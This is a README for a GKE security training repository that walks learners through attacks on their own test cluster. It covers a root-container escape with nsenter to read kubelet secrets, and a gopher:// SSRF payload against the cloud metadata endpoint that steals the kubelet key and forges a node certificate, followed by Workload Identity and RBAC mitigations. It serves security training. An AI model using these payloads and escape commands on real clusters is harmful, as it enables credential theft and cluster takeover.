# training-gke-security
This repository is for demo of training of GKE Security

[![Open in Cloud Shell](http://gstatic.com/cloudssh/images/open-btn.png)](https://console.cloud.google.com/cloudshell/open?git_repo=https://github.com/rung/training-gke-security&page=editor&cloudshell_tutorial=README.md)

## Preparation
#### Set project id
```
PROJECT_ID="Your Project Name"
```

```
gcloud config set project $PROJECT_ID
```

#### Enable GKE API
```bash
gcloud services enable container.googleapis.com
```

#### Create GKE Cluster
```bash
gcloud container clusters create gke-security-testing --zone us-central1-a --machine-type g1-small --num-nodes 3 --async
```
- You can check the status on [console](https://console.cloud.google.com/kubernetes/list)

#### Get a credential of GKE
```bash
gcloud container clusters get-credentials gke-security-testing --zone=us-central1-a
```

#### Testing
```
kubectl get node
```

#### Deploy web server
```
kubectl apply -f manifest/ssrf_server/ -R
```
- Please don't expose deployment on the Internet through Service.

## Demo 1: PodSecurityPolicy
#### Run root container
```
kubectl apply -f manifest/root/pod.yaml
```

#### Enter root
```
kubectl exec -it root-container -- /bin/sh -c "nsenter --mount=/proc/1/ns/mnt -- /bin/bash"
```

#### Get credentials
```
kubectl --kubeconfig /var/lib/kubelet/kubeconfig get secret dummy-secret -o yaml
```

#### Get credentials(method 2)
```
docker ps -q | xargs docker inspect --format='{{range .Config.Env}}{{println .}}{{end}}' | grep DB_Password
```

```
exit
```

#### How to block
  - RBAC
  - exec

## Demo 2: Workload Identity
#### Port-forward
```
kubectl port-forward deployment/ssrf-server 8080:8080 2>&1 >/dev/null &
```

#### Open Web Preview
<img src="https://github.com/rung/training-gke-security/raw/master/img/web-preview.png" width="320">

#### Input url (for testing)
```
https://www.google.com
```

#### Input malicious url
#### Get kubelet key
```
gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/attributes/kube-env?alt=json HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
```
It contains "KUBELET_KEY".

#### Save the metadata to metadata-script/metadata.txt
```
cd metadata-script
```

```
curl -X POST 'http://localhost:8080/get_contents' --data 'url=gopher%3A%2F%2F169.254.169.254%3A80%2F_GET+%2FcomputeMetadata%2Fv1%2Finstance%2Fattributes%2Fkube-env%3Falt%3Djson+HTTP%2F1.1%250d%250aMetadata-Flavor%3A+Google%250d%250aConnection%3A+Close%250d%250a%250d%250a' -o metadata.txt
```

- Move current kubeconfig file
```
mv ~/.kube/config ~/.kube/config.tmp
```
```
kubectl config get-contexts
```

#### Get node certificate
- Extract necessary data from metadata
```bash
bash extract.sh
ls -l metadata
```

- Send CSR and Get node certificate
```
bash make_cert.sh $(cat metadata/nodename)
```

#### Get credentials
- Set env vars
```
KUBE_OPT="--client-certificate newcert/node.crt --client-key newcert/new.key --certificate-authority metadata/ca.crt --server https://$(cat metadata/api_ip)" && echo $KUBE_OPT
```

- Get secretName
```
kubectl $KUBE_OPT describe pod | grep secret
```

- Get secret
```
kubectl $KUBE_OPT get secret dummy-secret -o yaml
```

#### (Reference) Get instance token (doesn't use it in this training)
```
gopher://169.254.169.254:80/_GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1%0d%0aMetadata-Flavor: Google%0d%0aConnection: Close%0d%0a%0d%0a
```

### How to block
#### [Workload Identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
```
gcloud beta container clusters update gke-security-testing --identity-namespace=${PROJECT_ID}.svc.id.goog --region us-central1-a
```

```
cloud beta container node-pools update [NODEPOOL_NAME] \
  --cluster=[CLUSTER_NAME] \
  --workload-metadata-from-node=GKE_METADATA_SERVER
```

## (After this training) Delete cluster
```bash
gcloud container clusters delete gke-security-testing --zone us-central1-a --async
```

## References
- [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876)
- [Hacking Kubelet on Google Kubernetes Engine](https://www.4armed.com/blog/hacking-kubelet-on-gke/)
- [The Path Less Traveled: Abusing Kubernetes Defaults](https://speakerdeck.com/iancoldwater/the-path-less-traveled-abusing-kubernetes-defaults)
